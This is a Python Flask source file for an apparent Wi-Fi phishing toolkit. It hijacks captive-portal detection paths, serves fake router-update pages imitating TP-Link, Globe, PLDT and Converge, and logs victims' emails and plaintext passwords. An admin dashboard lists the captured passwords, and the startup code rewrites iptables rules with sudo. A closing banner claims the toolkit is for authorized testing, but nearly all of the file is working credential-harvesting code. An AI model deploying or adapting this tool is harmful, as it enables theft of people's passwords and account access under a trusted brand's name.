import os
import sys
import logging
from logging.handlers import RotatingFileHandler
from flask import Flask, request, redirect, render_template, abort, session, jsonify
from datetime import datetime, timedelta
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
import hashlib
import json
from functools import wraps
import time
import secrets
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import ipaddress
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

console = Console()
app = Flask(__name__, template_folder="templates", static_folder="static")

# Security Configuration
app.config.update(
    SECRET_KEY=os.environ.get('SECRET_KEY', secrets.token_hex(32)),
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)
)

# SSL/TLS Configuration
SSL_CERT = os.environ.get('SSL_CERT', 'cert.pem')
SSL_KEY = os.environ.get('SSL_KEY', 'key.pem')

# IP Filtering Configuration
IP_WHITELIST_FILE = Path("config/ip_whitelist.txt")
IP_BLACKLIST_FILE = Path("config/ip_blacklist.txt")
IP_WHITELIST_FILE.parent.mkdir(parents=True, exist_ok=True)
IP_BLACKLIST_FILE.parent.mkdir(parents=True, exist_ok=True)

# Admin Configuration
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD_HASH = os.environ.get('ADMIN_PASSWORD_HASH', 
    hashlib.sha256('admin'.encode()).hexdigest())

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Configuration
log_path = Path("logs/phishing")
log_path.mkdir(parents=True, exist_ok=True)
access_log = log_path / "access_log.txt"
phish_log = log_path / "phish_log.txt"
default_brand = sys.argv[1] if len(sys.argv) > 1 else "tplink"

def load_ip_list(file_path):
    """Load IP addresses from whitelist/blacklist file"""
    if not file_path.exists():
        return set()
    with open(file_path, 'r') as f:
        return {line.strip() for line in f if line.strip()}

def save_ip_list(file_path, ip_list):
    """Save IP addresses to whitelist/blacklist file"""
    with open(file_path, 'w') as f:
        for ip in ip_list:
            f.write(f"{ip}\n")

def is_ip_allowed(ip):
    """Check if IP is allowed based on whitelist/blacklist"""
    whitelist = load_ip_list(IP_WHITELIST_FILE)
    blacklist = load_ip_list(IP_BLACKLIST_FILE)
    
    # If whitelist is empty, only check blacklist
    if not whitelist:
        return ip not in blacklist
    
    # If whitelist exists, IP must be in whitelist and not in blacklist
    return ip in whitelist and ip not in blacklist

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin/login')
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if (username == ADMIN_USERNAME and 
            hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH):
            session['admin_logged_in'] = True
            session.permanent = True
            return redirect('/admin')
        return render_template('admin/login.html', error='Invalid credentials')
    
    return render_template('admin/login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect('/admin/login')

@app.route('/admin')
@login_required
def admin_dashboard():
    # Count total captures
    try:
        with open(phish_log, 'r') as f:
            lines = f.readlines()
            total_captures = len(lines)
    except FileNotFoundError:
        lines = []
        total_captures = 0

    # Parse last 10 captured passwords
    captured_passwords = []
    for line in lines[-10:]:
        try:
            entry = json.loads(line)
            captured_passwords.append(entry)
        except Exception:
            continue

    # Count active and blocked IPs
    whitelist = load_ip_list(IP_WHITELIST_FILE)
    blacklist = load_ip_list(IP_BLACKLIST_FILE)
    active_ips = len(whitelist)
    blocked_ips = len(blacklist)

    # Get recent activity (last 10 lines from access_log)
    try:
        with open(access_log, 'r') as f:
            access_lines = f.readlines()[-10:]
        recent_activity = [
            {'timestamp': line.split(']')[0][1:], 'description': line.strip()} for line in access_lines
        ]
    except FileNotFoundError:
        recent_activity = []

    return render_template(
        'admin/dashboard.html',
        total_captures=total_captures,
        active_ips=active_ips,
        blocked_ips=blocked_ips,
        recent_activity=recent_activity,
        captured_passwords=captured_passwords
    )

@app.route('/admin/ip-management', methods=['GET', 'POST'])
@login_required
def ip_management():
    if request.method == 'POST':
        action = request.form.get('action')
        ip = request.form.get('ip')
        
        try:
            # Validate IP address
            ipaddress.ip_address(ip)
            
            if action == 'whitelist':
                whitelist = load_ip_list(IP_WHITELIST_FILE)
                whitelist.add(ip)
                save_ip_list(IP_WHITELIST_FILE, whitelist)
            elif action == 'blacklist':
                blacklist = load_ip_list(IP_BLACKLIST_FILE)
                blacklist.add(ip)
                save_ip_list(IP_BLACKLIST_FILE, blacklist)
            elif action == 'remove_whitelist':
                whitelist = load_ip_list(IP_WHITELIST_FILE)
                whitelist.discard(ip)
                save_ip_list(IP_WHITELIST_FILE, whitelist)
            elif action == 'remove_blacklist':
                blacklist = load_ip_list(IP_BLACKLIST_FILE)
                blacklist.discard(ip)
                save_ip_list(IP_BLACKLIST_FILE, blacklist)
                
        except ValueError:
            return jsonify({'error': 'Invalid IP address'}), 400
            
    whitelist = load_ip_list(IP_WHITELIST_FILE)
    blacklist = load_ip_list(IP_BLACKLIST_FILE)
    return render_template('admin/ip_management.html', 
                         whitelist=whitelist, 
                         blacklist=blacklist)

@app.before_request
def check_ip():
    if request.path.startswith('/admin'):
        return  # Skip IP check for admin routes
        
    if not is_ip_allowed(request.remote_addr):
        logger.warning(f"Blocked access from IP: {request.remote_addr}")
        abort(403)  # Forbidden

def hash_password(password):
    """Hash password using SHA-256"""
    return hashlib.sha256(password.encode()).hexdigest()

@app.before_request
def log_access():
    try:
        ip = request.remote_addr
        ua = request.headers.get("User-Agent", "Unknown")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Rotate log file if it gets too large (10MB)
        if access_log.stat().st_size > 10 * 1024 * 1024:
            backup_log = log_path / f"access_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            access_log.rename(backup_log)
            
        with open(access_log, "a") as f:
            f.write(f"[{ts}] IP: {ip} | UA: {ua} | Path: {request.path}\n")
    except Exception as e:
        logger.error(f"Error logging access: {str(e)}")

CAPTIVE_TRIGGERS = [
    "/generate_204", "/gen_204", "/ncsi.txt", "/library/test/success.html",
    "/hotspot-detect.html", "/connecttest.txt", "/fwlink"
]

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path):
    if any(trigger in request.path for trigger in CAPTIVE_TRIGGERS):
        return redirect("/phishing")

    brand = request.args.get("brand", default_brand).lower()
    allowed = ["tplink", "globe", "pldt", "converge"]
    if brand not in allowed:
        brand = "tplink"
    return render_template(f"phishing/router-update/{brand}.html")

@app.route("/phishing")
def phishing_redirect():
    return redirect(f"/?brand={default_brand}")

@app.route("/phish", methods=["POST"])
@limiter.limit("5 per minute")
def capture():
    try:
        password = request.form.get("password", "N/A")
        email = request.form.get("email", "")
        if not password or password == "N/A":
            return abort(400)  # Bad Request
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hashed_password = hash_password(password)
        log_entry = {
            "timestamp": timestamp,
            "ip": request.remote_addr,
            "email": email,
            "hashed_password": hashed_password,
            "original_password": password
        }
        with open(phish_log, "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        return "<h3>✅ Update successful. Please wait while we reboot your router...</h3>", 200
    except Exception as e:
        logger.error(f"Error capturing password: {str(e)}")
        return abort(500)  # Internal Server Error

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

if __name__ == "__main__":
    try:
        # Configure iptables with error handling
        iptables_commands = [
            "sudo iptables -t nat -F",
            "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80",
            "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443"
        ]
        
        for cmd in iptables_commands:
            result = os.system(cmd)
            if result != 0:
                logger.error(f"Failed to execute iptables command: {cmd}")
                sys.exit(1)

        local_ip = get_local_ip()
        console.print(Panel.fit(
            f"[bold cyan]📡 Visit:[/] [green]http://{local_ip}[/] or connect via WiFi\n\n"
            "[bold yellow]🌐 Use specific brands by browsing:[/]\n"
            f"[bold]TP-Link:[/]     [green]http://{local_ip}/?brand=tplink[/]\n"
            f"[bold]Globe:[/]       [green]http://{local_ip}/?brand=globe[/]\n"
            f"[bold]PLDT:[/]        [green]http://{local_ip}/?brand=pldt[/]\n"
            f"[bold]Converge:[/]    [green]http://{local_ip}/?brand=converge[/]\n\n"
            f"[bold red]🔑 Captured passwords are saved in:[/] [green]{phish_log}[/]\n"
            f"[bold yellow]📝 Access logs are saved in:[/] [green]{access_log}[/]\n\n"
            "[bold green] SSL/TLS is enabled (self-signed certificate)[/]\n"
            "[bold blue]👤 Admin panel available at:[/] [green]/admin[/]\n\n"
            "[bold red]⚠️ [/] [bold]NOTE:[/] To use this toolkit in real life, you must use a certificate from a real Certificate Authority (CA).\n"
            "This toolkit is for [bold yellow]learning and authorized testing purposes only[/]. Unauthorized use is illegal!",
            title="[bold magenta]Phishing Server Info[/]",
            border_style="bright_magenta"
        ))

        # Check for SSL certificates
        if not os.path.exists(SSL_CERT) or not os.path.exists(SSL_KEY):
            console.print("[bold red]⚠️ SSL certificates not found. Generating self-signed certificates...[/]")
            os.system(f"openssl req -x509 -newkey rsa:4096 -nodes -out {SSL_CERT} -keyout {SSL_KEY} -days 365 -subj '/CN=localhost'")

        app.run(
            host="0.0.0.0",
            port=443,
            ssl_context=(SSL_CERT, SSL_KEY)
        )
    except Exception as e:
        logger.error(f"Server startup error: {str(e)}")
        sys.exit(1)
